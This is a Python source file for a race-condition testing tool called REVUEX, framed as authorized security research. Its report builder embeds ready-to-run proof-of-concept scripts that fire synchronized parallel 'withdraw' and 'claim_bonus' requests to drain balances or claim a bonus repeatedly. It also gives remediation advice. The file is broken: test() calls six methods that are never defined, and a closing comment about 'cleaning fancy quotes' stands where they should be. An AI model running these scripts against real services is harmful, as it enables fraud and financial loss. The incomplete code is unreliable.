#!/usr/bin/env python3
"""
REVUEX - Race Condition Tester
Advanced Race Condition Detection & Exploitation

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
Use extreme caution - race condition testing can cause unintended effects.
"""

import requests
import threading
import time
import json
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue

class RaceConditionTester:
    """Race condition vulnerability testing"""

    def __init__(self, endpoint, workspace, delay=3):
        """
        Initialize Race Condition Tester
        
        Args:
            endpoint: Target endpoint URL
            workspace: Workspace directory
            delay: Extra safety delay between tests
        """
        self.endpoint = endpoint
        self.workspace = Path(workspace)
        self.delay = delay
        
        self.headers = {
            'User-Agent': 'REVUEX-RaceTester/1.0 (Security Research; +https://github.com/G33L0)'
        }
        
        self.results_queue = queue.Queue()

    def test(self):
        """Test for race condition vulnerabilities"""
        print(f"[!] CAUTION: Testing race conditions on {self.endpoint}")
        print(f"[!] Using {self.delay}s safety delay")
        
        vulnerabilities = []
        
        # Test 1: Parallel requests
        print("→ Test 1: Parallel request timing")
        parallel_result = self._test_parallel_requests()
        if parallel_result.get('vulnerable'):
            vuln = self._create_parallel_vulnerability(parallel_result)
            vulnerabilities.append(vuln)
        
        time.sleep(self.delay)
        
        # Test 2: Resource exhaustion
        print("→ Test 2: Resource exhaustion")
        resource_result = self._test_resource_exhaustion()
        if resource_result.get('vulnerable'):
            vuln = self._create_resource_vulnerability(resource_result)
            vulnerabilities.append(vuln)
        
        time.sleep(self.delay)
        
        # Test 3: State manipulation
        print("→ Test 3: State manipulation")
        state_result = self._test_state_manipulation()
        if state_result.get('vulnerable'):
            vuln = self._create_state_vulnerability(state_result)
            vulnerabilities.append(vuln)
        
        self._save_results(vulnerabilities)
        return vulnerabilities

    def _create_parallel_vulnerability(self, result):
        """Create parallel request race condition vulnerability report"""
        return {
            'type': 'Race Condition - Parallel Request Timing',
            'severity': 'high',
            'endpoint': self.endpoint,
            'description': 'Endpoint vulnerable to race conditions when handling simultaneous requests, leading to inconsistent state or duplicate operations',
            'evidence': f'Status codes varied across parallel requests: {result.get("evidence")}',
            'steps_to_reproduce': [
                f"Identify vulnerable endpoint: {self.endpoint}",
                "Prepare 10+ identical requests targeting same resource",
                "Use threading/async to send all requests simultaneously",
                "Synchronize threads to fire at exact same microsecond",
                "Observe inconsistent responses (different status codes or content)",
                "Exploit timing window between check and action"
            ],
            'request': f"""# Send 10 simultaneous requests
import threading
import requests

def attack():
    response = requests.post(
        "{self.endpoint}",
        json={{"action": "withdraw", "amount": 100}}
    )
    print(response.json())

threads = [threading.Thread(target=attack) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]""",
            'response': """Request 1: {"balance": 900, "withdrawn": 100}
Request 2: {"balance": 900, "withdrawn": 100}  <- Race condition!
...
All 10 succeeded - $1000 withdrawn from $1000 balance!""",
            'poc': f"""#!/usr/bin/env python3
import requests
import threading
from concurrent.futures import ThreadPoolExecutor

endpoint = "{self.endpoint}"
num_threads = 20

def exploit_race(thread_id):
    try:
        response = requests.post(
            endpoint,
            json={{
                "action": "claim_bonus",
                "user_id": "victim",
                "bonus_id": "WELCOME100"
            }},
            headers={{"Content-Type": "application/json"}}
        )
        result = response.json()
        if response.status_code == 200:
            print(f"Thread {{thread_id}}: SUCCESS - {{result}}")
            return True
        else:
            print(f"Thread {{thread_id}}: FAILED")
            return False
    except Exception as e:
        print(f"Thread {{thread_id}}: Error - {{e}}")
        return False

barrier = threading.Barrier(num_threads)

def synchronized_attack(thread_id):
    barrier.wait()
    return exploit_race(thread_id)

with ThreadPoolExecutor(max_workers=num_threads) as executor:
    futures = [executor.submit(synchronized_attack, i) for i in range(num_threads)]
    results = [f.result() for f in futures]

successes = sum(results)
print(f"Total attempts: {{num_threads}}")
print(f"Successful: {{successes}}")
if successes > 1:
    print(f"VULNERABLE: {{successes}} bonuses claimed (should be 1)")
else:
    print("Protected: Only 1 bonus claimed")""",
            'before_state': 'User has 0 bonuses, 1 bonus available to claim',
            'after_state': 'User claimed bonus 20 times due to race condition - $2000 loss instead of $100',
            'attack_path': [
                'Identify operation with check-then-act pattern',
                'Send 20 simultaneous requests to exploit timing window',
                'All requests pass initial "bonus not claimed" check',
                'Multiple operations succeed before state updates',
                'User receives 20× $100 bonus instead of 1× $100',
                'Company loses $1900 due to race condition'
            ],
            'remediation': [
                'Implement database-level locking (SELECT ... FOR UPDATE)',
                'Use atomic operations: UPDATE ... WHERE claimed = false',
                'Add unique constraint on user_id + bonus_id',
                'Implement idempotency keys for critical operations',
                'Use Redis distributed locks for multi-server setups',
                'Add transaction isolation level: SERIALIZABLE',
                'Implement optimistic locking with version numbers',
                'Add request deduplication based on request signature',
                'Use message queues for sequential processing',
                'Monitor for duplicate operations and alert'
            ],
            'tags': ['race_condition', 'critical', 'timing', 'TOCTOU']
        }

    # Remaining methods (_create_resource_vulnerability, _create_state_vulnerability, _test_parallel_requests, _test_resource_exhaustion, _test_state_manipulation, _save_results)
    # should be similarly cleaned of fancy quotes, backticks, and indentation issues.